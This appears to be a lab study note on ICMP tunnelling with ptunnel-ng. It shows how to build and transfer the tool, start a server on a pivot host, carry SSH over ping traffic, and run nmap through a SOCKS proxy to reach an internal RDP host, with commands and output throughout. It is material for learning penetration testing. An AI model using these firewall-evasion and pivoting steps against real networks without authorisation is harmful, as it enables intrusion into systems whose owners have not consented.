---
description: >-
  Encapsulates your traffic within ICMP packets containing echo requests and
  responses
---

# ICMP Tunneling with SOCKS

This type of tunneling will only work if ping is allowed in a firewalled network.

### Setting Up & Using ptunnel-ng

If ptunnel-ng is not on our attack host, we can clone the project using git.

**Cloning Ptunnel-ng**

```shell-session
git clone https://github.com/utoni/ptunnel-ng.git
```

**Building Ptunnel-ng with Autogen.sh**

```shell-session
sudo ./autogen.sh
```

**Transferring Ptunnel-ng to the Pivot Host**

```shell-session
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

> Note that we transferred the enitre directory

**Starting the ptunnel-ng Server on the Target Host**

```shell-session
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

* `-r` to specify IP that will be **accepting** connections.

**Connecting to ptunnel-ng Server from Attack Host**

```shell-session
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

* `-p` \<ipAddressofTarget>

We can attempt to connect to the target using SSH through local port 2222 (`-p2222`).

**Tunneling an SSH connection through an ICMP Tunnel**

```shell-session
carbonlky@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
. . . SNIP . . .
Last login: Wed May 11 14:53:22 2022 from 10.10.14.18
ubuntu@WEB01:~$ 
```

We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

**Enabling Dynamic Port Forwarding over SSH**

```shell-session
carbonlky@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

**Proxychaining through the ICMP Tunnel**

```shell-session
carbonlky@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```
